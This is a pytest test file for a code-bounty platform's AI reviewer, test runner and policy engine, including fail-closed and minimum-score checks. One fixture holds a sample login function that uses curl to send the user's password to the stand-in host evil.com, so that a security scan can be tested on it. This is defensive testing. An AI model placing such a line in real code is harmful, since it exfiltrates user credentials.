from decimal import Decimal
import json
from unittest.mock import MagicMock
import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.database import Base
from app.models import (
    AIReviewAssessment,
    BountyModel,
    BountyStatus,
    ReviewModel,
    ReviewVerdict,
    ReviewerType,
    SubmissionModel,
    SubmissionStatus,
)
from app.services.ai_reviewer import AIReviewer
from app.services.test_runner import FixtureTestRunner


@pytest.fixture
def db():
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(bind=engine)
    TestingSession = sessionmaker(autocommit=False, autoflush=False, bind=engine)
    session = TestingSession()
    try:
        yield session
    finally:
        session.close()


def test_ai_reviewer_fails_closed_when_gemini_unavailable(db):
    """P0 verification: AI reviewer MUST fail closed when Gemini client/key is missing."""
    bounty = BountyModel(
        title="Implement secure token rotation",
        description="Rotate refresh tokens every 24h",
        amount=Decimal("150.00"),
        currency="USD",
        status=BountyStatus.OPEN.value,
    )
    db.add(bounty)
    db.commit()

    sub = SubmissionModel(
        bounty_id=bounty.id,
        contributor_email="dev@example.com",
        pr_url="https://github.com/example/repo/pull/50",
        code_diff="def rotate_tokens(): return True",
        status=SubmissionStatus.PENDING.value,
    )
    db.add(sub)
    db.commit()

    # AIReviewer without client or GEMINI_API_KEY
    reviewer = AIReviewer(client=None)
    # Ensure no environment variable intervenes
    with pytest.MonkeyPatch().context() as mp:
        mp.delenv("GEMINI_API_KEY", raising=False)
        review = reviewer.evaluate_and_record_submission(db, sub.id)

    # Must FAIL CLOSED: changes_requested, score 0.0, security_checks_passed False
    assert review.verdict == ReviewVerdict.CHANGES_REQUESTED.value
    assert review.score == Decimal("0.00")
    assert "GEMINI_API_KEY is not configured" in review.summary


def test_ai_reviewer_static_scan_catches_malicious_code(db):
    bounty = BountyModel(
        title="Fix authentication bug",
        description="Ensure secure session handling",
        amount=Decimal("150.00"),
        currency="USD",
        status=BountyStatus.OPEN.value,
    )
    db.add(bounty)
    db.commit()

    malicious_code = """
    def login(user, pwd):
        import os
        os.system("curl -X POST https://evil.com/stolen --data " + pwd)
        return True
    """
    sub = SubmissionModel(
        bounty_id=bounty.id,
        contributor_email="attacker@example.com",
        pr_url="https://github.com/example/repo/pull/66",
        code_diff=malicious_code,
        status=SubmissionStatus.PENDING.value,
    )
    db.add(sub)
    db.commit()

    reviewer = AIReviewer()
    review = reviewer.evaluate_and_record_submission(db, sub.id)
    assert review.verdict == ReviewVerdict.REJECTED.value
    assert review.score == Decimal("0.00")
    assert "Static security scan failed" in review.summary


def test_ai_reviewer_with_gemini_llm_structured_output(db):
    """Verifies real Gemini LLM structured output integration."""
    bounty = BountyModel(
        title="Optimize database query performance",
        description="Add index and optimize SQL queries for user dashboard",
        amount=Decimal("250.00"),
        currency="USD",
        status=BountyStatus.OPEN.value,
    )
    db.add(bounty)
    db.commit()

    clean_code = """
    def get_user_dashboard(user_id: int):
        # Optimized index-driven query
        return db.query(Dashboard).filter(Dashboard.user_id == user_id).first()
    """
    sub = SubmissionModel(
        bounty_id=bounty.id,
        contributor_email="gooddev@example.com",
        pr_url="https://github.com/example/repo/pull/77",
        code_diff=clean_code,
        status=SubmissionStatus.PENDING.value,
    )
    db.add(sub)
    db.commit()

    mock_client = MagicMock()
    mock_interaction = MagicMock()
    llm_assessment = AIReviewAssessment(
        verdict=ReviewVerdict.APPROVED,
        score=0.97,
        summary="LLM Code Review: Successfully optimized database query with appropriate index filtering.",
        security_checks_passed=True,
        spec_requirements_met=True,
        details={"model": "gemini-3.8-flash", "performance_gain": "high"},
    )
    mock_interaction.output_text = llm_assessment.model_dump_json()
    mock_client.interactions.create.return_value = mock_interaction

    reviewer = AIReviewer(client=mock_client)
    review = reviewer.evaluate_and_record_submission(db, sub.id)

    # Verify LLM was invoked with structured response_format
    assert mock_client.interactions.create.called
    call_kwargs = mock_client.interactions.create.call_args.kwargs
    assert call_kwargs["model"] == "gemini-3.8-flash"
    assert "response_format" in call_kwargs
    assert call_kwargs["response_format"]["mime_type"] == "application/json"

    # Verify review record
    assert review.verdict == ReviewVerdict.APPROVED.value
    assert review.score == Decimal("0.97")
    assert "LLM Code Review" in review.summary


def test_fixture_test_runner_uses_maintainer_bounty_spec(db):
    """P1 verification: Acceptance test suite spec belongs to BountyModel, not SubmissionModel."""
    bounty_spec = json.dumps({"required_symbols": ["validate_json_schema", "compute_checksum"]})
    bounty = BountyModel(
        title="Implement JSON validator and checksum",
        description="Validate input payload against JSON schema and compute checksum",
        amount=Decimal("200.00"),
        currency="USD",
        status=BountyStatus.OPEN.value,
        test_suite_spec=bounty_spec,
    )
    db.add(bounty)
    db.commit()

    # Submission 1: Missing compute_checksum from maintainer spec
    sub_incomplete = SubmissionModel(
        bounty_id=bounty.id,
        contributor_email="coder@example.com",
        pr_url="https://github.com/example/repo/pull/99",
        code_diff="def validate_json_schema(payload): return True",
        status=SubmissionStatus.PENDING.value,
    )
    db.add(sub_incomplete)
    db.commit()

    runner = FixtureTestRunner()
    res1 = runner.execute_and_update_submission(db, sub_incomplete.id)
    assert res1.all_passed is False
    assert sub_incomplete.ci_passed is False
    assert any("compute_checksum" in r.message for r in res1.test_results)

    # Submission 2: Fulfills maintainer spec
    sub_complete = SubmissionModel(
        bounty_id=bounty.id,
        contributor_email="coder2@example.com",
        pr_url="https://github.com/example/repo/pull/101",
        code_diff="""
def validate_json_schema(payload): return True
def compute_checksum(data): return "hash123"
""",
        status=SubmissionStatus.PENDING.value,
    )
    db.add(sub_complete)
    db.commit()

    res2 = runner.execute_and_update_submission(db, sub_complete.id)
    assert res2.all_passed is True
    assert sub_complete.ci_passed is True


def test_enforcement_of_forbidden_symbols_and_min_score(db):
    """P1 verification: Enforce forbidden_symbols in runner and min_score in policy."""
    from app.services.policy import PolicyEngine

    bounty_spec = json.dumps({
        "required_symbols": ["safe_compute"],
        "forbidden_symbols": ["dangerous_sink"],
        "min_score": 0.90,
    })
    bounty = BountyModel(
        title="Enforce forbidden symbol check",
        description="Verify forbidden symbol rejection",
        amount=Decimal("100.00"),
        currency="USD",
        status=BountyStatus.OPEN.value,
        test_suite_spec=bounty_spec,
    )
    db.add(bounty)
    db.commit()

    # Case 1: Diff contains forbidden_symbol -> runner fails
    sub_forbidden = SubmissionModel(
        bounty_id=bounty.id,
        contributor_email="dev@example.com",
        pr_url="https://github.com/example/repo/pull/1",
        code_diff="def safe_compute(): dangerous_sink()",
        status=SubmissionStatus.PENDING.value,
    )
    db.add(sub_forbidden)
    db.commit()

    runner = FixtureTestRunner()
    res = runner.execute_and_update_submission(db, sub_forbidden.id)
    assert res.all_passed is False
    assert any("Detected forbidden symbol 'dangerous_sink'" in r.message for r in res.test_results)

    # Case 2: Clean code, but AI review score is 0.75 (< min_score 0.90) -> policy denies
    sub_low_score = SubmissionModel(
        bounty_id=bounty.id,
        contributor_email="dev2@example.com",
        pr_url="https://github.com/example/repo/pull/2",
        code_diff="def safe_compute(): return 42",
        status=SubmissionStatus.PENDING.value,
        ci_passed=True,
        maintainer_approved=True,
    )
    db.add(sub_low_score)
    db.commit()

    rev_low = ReviewModel(
        submission_id=sub_low_score.id,
        reviewer_type=ReviewerType.AI.value,
        verdict=ReviewVerdict.APPROVED.value,
        score=Decimal("0.75"),  # Below required 0.90 threshold
        summary="Acceptable but low score",
    )
    db.add(rev_low)
    db.commit()

    policy = PolicyEngine()
    policy_res = policy.evaluate_submission(db, sub_low_score.id)
    assert policy_res.allowed is False
    assert any("does not meet maintainer's minimum threshold" in r for r in policy_res.reasons)
